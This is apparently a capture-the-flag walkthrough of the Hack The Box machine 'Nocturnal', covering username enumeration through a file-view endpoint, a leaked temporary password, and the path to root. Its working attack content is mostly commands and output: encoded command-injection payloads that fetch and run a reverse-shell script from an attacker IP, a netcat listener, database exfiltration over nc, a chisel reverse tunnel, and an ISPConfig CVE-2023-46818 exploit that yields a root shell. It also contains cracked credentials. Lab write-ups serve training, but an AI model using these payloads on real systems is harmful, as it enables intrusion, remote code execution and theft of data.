# User flag
## 1. rustscan

```python
# Nmap 7.94SVN scan initiated Tue Apr 15 08:22:31 2025 as: /usr/lib/nmap/nmap --privileged -vvv -p 22,80 -sC -sV -oN nocturnal 10.129.71.191
Nmap scan report for nocturnal.htb (10.129.71.191)
Host is up, received reset ttl 63 (0.23s latency).
Scanned at 2025-04-15 08:22:31 EDT for 15s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDpf3JJv7Vr55+A/O4p/l+TRCtst7lttqsZHEA42U5Edkqx/Kb8c+F0A4wMCVOMqwyR/PaMdmzAomYGvNYhi3NelwIEqdKKnL+5svrsStqb9XjyShPD9SQK5Su7xBt+/TfJyJFRcsl7ZJdfc6xnNHQITvwa6uZhLsicycj0yf1Mwdzy9hsc8KRY2fhzARBaPUFdG0xte2MkaGXCBuI0tMHsqJpkeZ46MQJbH5oh4zqg2J8KW+m1suAC5toA9kaLgRis8p/wSiLYtsfYyLkOt2U+E+FZs4i3vhVxb9Sjl9QuuhKaGKQN2aKc8ItrK8dxpUbXfHr1Y48HtUejBj+AleMrUMBXQtjzWheSe/dKeZyq8EuCAzeEKdKs4C7ZJITVxEe8toy7jRmBrsDe4oYcQU2J76cvNZomU9VlRv/lkxO6+158WtxqHGTzvaGIZXijIWj62ZrgTS6IpdjP3Yx7KX6bCxpZQ3+jyYN1IdppOzDYRGMjhq5ybD4eI437q6CSL20=
|   256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLcnMmaOpYYv5IoOYfwkaYqI9hP6MhgXCT9Cld1XLFLBhT+9SsJEpV6Ecv+d3A1mEOoFL4sbJlvrt2v5VoHcf4M=
|   256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIASsDOOb+I4J4vIK5Kz0oHmXjwRJMHNJjXKXKsW0z/dy
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Welcome to Nocturnal
| http-methods: 
|_  Supported Methods: GET HEAD POST
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## 2. Check website 

![[Pasted image 20250415203003.png]]

User enum vuln:
![[Pasted image 20250415203128.png]]![[Pasted image 20250415203142.png]]
```python
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ sudo ffuf -r -u "http://nocturnal.htb/view.php?username=FFUF&file=../../../../test.pdf" -w /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt:FFUF -H "Cookie: PHPSESSID=0usvdkuaee2d18thofjq2clm0v" -fw 1170 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://nocturnal.htb/view.php?username=FFUF&file=../../../../test.pdf
 :: Wordlist         : FFUF: /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt
 :: Header           : Cookie: PHPSESSID=0usvdkuaee2d18thofjq2clm0v
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response words: 1170
________________________________________________

admin                   [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 258ms]
amanda                  [Status: 200, Size: 3113, Words: 1175, Lines: 129, Duration: 244ms]
```

![[Pasted image 20250415203807.png]]
```xml
# in privacy.odt

<text:p text:style-name="P1">
Nocturnal has set the following temporary password for you: arHkG7HAI68X8s1J. This password has been set for all our services, so it is essential that you change it on your first login to ensure the security of your account and our infrastructure.
</text:p>
<text:p text:style-name="P1">
The file has been created and provided by Nocturnal's IT team. If you have any questions or need additional assistance during the password change process, please do not hesitate to contact us.
</text:p>
<text:p text:style-name="P1">
Remember that maintaining the security of your credentials is paramount to protecting your information and that of the company. We appreciate your prompt attention to this matter.
</text:p>
<text:p text:style-name="P1"/>
<text:p text:style-name="P1">Yours sincerely,</text:p>
<text:p text:style-name="P1">Nocturnal's IT team</text:p>
```
## 3. check source code
![[Pasted image 20250415204439.png]]
```python
function cleanEntry($entry) {
    $blacklist_chars = [';', '&', '|', '$', ' ', '`', '{', '}', '&&'];

    foreach ($blacklist_chars as $char) {
        if (strpos($entry, $char) !== false) {
            return false; // Malicious input detected
        }
    }

    return htmlspecialchars($entry, ENT_QUOTES, 'UTF-8');
}

# command execute
$password = cleanEntry($_POST['password']);
    $backupFile = "backups/backup_" . date('Y-m-d') . ".zip";

    if ($password === false) {
        echo "<div class='error-message'>Error: Try another password.</div>";
    } else {
        $logFile = '/tmp/backup_' . uniqid() . '.log';
       
        $command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";

# we can use this to get rev shell
password=%22%0acurl%09http://10.10.14.45:443/rev.sh%09-o%09rev.sh%23&backup=
password=%22%0abash%09rev.shls%23&backup=
```

## 4. shell as `www-data`
```python
┌──(kali㉿kali)-[~/Downloads/backup]
└─$ nc -lvnp 443 
listening on [any] 443 ...
connect to [10.10.14.45] from (UNKNOWN) [10.129.71.191] 51190
bash: cannot set terminal process group (1025): Inappropriate ioctl for device
bash: no job control in this shell
www-data@nocturnal:~/nocturnal.htb$ 
```

## 5. get db to analysis
```python
www-data@nocturnal:~/nocturnal_database$ nc -q 0 10.10.14.45 443 < nocturnal_database.db

┌──(kali㉿kali)-[~/Downloads/backup]
└─$ nc -lnp 443 > test.db
```

![[Pasted image 20250415220959.png]]

```
55c82b1ccd55ab219b3b109b07d5061d:slowmotionapocalypse
```

## 6. ssh as tobias
```python
www-data@nocturnal:~/nocturnal_database$ cat /etc/passwd | grep sh

root:x:0:0:root:/root:/bin/bash
tobias:x:1000:1000:tobias:/home/tobias:/bin/bash

┌──(kali㉿kali)-[~/Downloads/backup]
└─$ ssh tobias@10.129.71.191

tobias@nocturnal:~$ id
uid=1000(tobias) gid=1000(tobias) groups=1000(tobias)
6b63ab65701c0680e2d3649ecd4e5a79
```

# root flag
## 1. Check service
```python
tobias@nocturnal:~$ ss -ltnp
State          Recv-Q         Send-Q                   Local Address:Port                    Peer Address:Port         Process        
LISTEN         0              70                           127.0.0.1:33060                        0.0.0.0:*                           
LISTEN         0              151                          127.0.0.1:3306                         0.0.0.0:*                           
LISTEN         0              10                           127.0.0.1:587                          0.0.0.0:*                           
LISTEN         0              511                            0.0.0.0:80                           0.0.0.0:*                           
LISTEN         0              4096                         127.0.0.1:8080                         0.0.0.0:*                           
LISTEN         0              4096                     127.0.0.53%lo:53                           0.0.0.0:*                           
LISTEN         0              128                            0.0.0.0:22                           0.0.0.0:*                           
LISTEN         0              10                           127.0.0.1:25                           0.0.0.0:*                           
LISTEN         0              128                               [::]:22                              [::]:* 

┌──(kali㉿kali)-[~/Tools/scripts]
└─$ ./chisel server --reverse -p 8888
2025/04/15 10:22:41 server: Reverse tunnelling enable
2025/04/15 10:22:41 server: Fingerprint yRdNcdC1Ht2FoETQwa6FMATHGgkFPo=
2025/04/15 10:22:41 server: Listening on http://0.0.0
2025/04/15 10:23:52 server: session#4: tun: proxy#R:8:8080: Listening
2025/04/15 10:30:39 server: session#5: tun: proxy#R:8080=>8080: Listening

tobias@nocturnal:~$ ./chisel client 10.10.14.45:8888 R:8080:127.0.0.1:8080
2025/04/15 14:32:55 client: Connecting to ws://10.10.14.45:8888
2025/04/15 14:32:57 client: Connected (Latency 219.899214ms)
```
![[Pasted image 20250415223426.png]]

## 2. login to sevice
![[Pasted image 20250415223649.png]]
![[Pasted image 20250415223721.png]]
find this: https://github.com/bipbopbup/CVE-2023-46818-python-exploit

```python
┌──(kali㉿kali)-[~/Desktop/htb/CVE-2023-46818-python-exploit]
└─$ python3 exploit.py http://localhost:8080 admin slowmotionapocalypse         
[+] Target URL: http://localhost:8080/
[+] Logging in with username 'admin' and password 'slowmotionapocalypse'
[+] Injecting shell
[+] Launching shell

ispconfig-shell# id
uid=0(root) gid=0(root) groups=0(root)
```